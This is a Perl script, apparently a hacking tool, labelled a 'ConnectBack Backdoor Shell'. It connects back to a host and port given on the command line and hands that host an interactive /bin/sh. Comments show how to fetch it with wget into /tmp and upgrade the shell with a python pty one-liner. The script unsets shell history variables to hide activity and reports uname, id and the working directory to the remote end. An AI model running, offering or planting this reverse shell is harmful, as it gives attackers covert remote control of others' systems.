#!/usr/bin/perl
#Usage
# wget -O /tmp/bc.pl <shell url> ; perl /tmp/bc.pl <IP> <PORT>
# python -c 'import pty; pty.spawn("/bin/bash")'
use IO::Socket;
$system = '/bin/sh';
$ARGC=@ARGV;
print "--== ConnectBack Backdoor Shell EDITED BY Savitar ==-- \n\n";
if ($ARGC!=2) {
  print "Usage: $0 [Host] [Port] \n\n";
  die "Ex: $0 127.0.0.1 2121 \n";
}
use Socket;
use FileHandle;
socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or die print "[-] Unable to Resolve Host\n";
connect(SOCKET, sockaddr_in($ARGV[1], inet_aton($ARGV[0]))) or die print "[-] Unable to Connect Host\n";
print "[*] Resolving HostName\n";
print "[*] Connecting... $ARGV[0] \n";
print "[*] Spawning Shell \n";
print "[*] Connected to remote host \n";
SOCKET->autoflush();
open(STDIN, ">&SOCKET");
open(STDOUT,">&SOCKET");
open(STDERR,">&SOCKET");
print "--== ConnectBack Backdoor Shell EDITED BY Savitar ==-- \n\n";
system("unset HISTFILE; unset SAVEHIST;echo --==Systeminfo==--; uname -a;echo;
echo --==Userinfo==--; id;echo;echo --==Directory==--; pwd;echo; echo --==Shell==-- ");
system($system);
#EOF
